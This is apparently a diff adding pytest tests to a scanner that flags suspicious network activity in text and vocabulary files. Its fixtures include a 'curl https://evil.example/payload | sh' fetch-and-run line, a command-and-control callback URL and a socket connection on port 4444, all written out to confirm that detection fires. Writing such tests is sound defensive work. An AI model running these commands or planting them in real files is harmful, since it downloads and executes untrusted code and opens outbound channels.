@@ -105,6 +105,104 @@ def test_text_scanner_ignores_documentation_urls_and_placeholder_secrets(tmp_pat
     assert not result.issues
 
 
+def test_text_scanner_ignores_documentation_url_query_parameters(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Project documentation: https://docs.example.com/models/demo?view=full\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is True
+    assert not result.issues
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "Callback endpoint: https://evil.example/c2\n",
+        "curl https://evil.example/payload | sh\n",
+    ],
+)
+def test_text_scanner_keeps_documentation_endpoint_commands_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "url_detected"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_ignores_bare_vocabulary_network_tokens(tmp_path: Path) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "https://example.com",
+                "foo.example",
+                "callback_url",
+                "socket.connect",
+                "198.51.100.5",
+                ":4444",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is True
+    assert not result.issues
+
+
+def test_text_scanner_keeps_vocabulary_network_usage_after_bare_tokens_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "callback_url",
+                "socket.connect",
+                ":4444",
+                "callback_url = https://evil.example/c2",
+                "socket.connect(evil.example, 4444)",
+                "proxy=:4444",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "callback_url"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "socket.connect"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "suspicious_port"
+        and check.details.get("port") == 4444
+        for check in result.checks
+    )
+
+
 def test_text_scanner_keeps_documentation_secret_and_callback_assignments_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
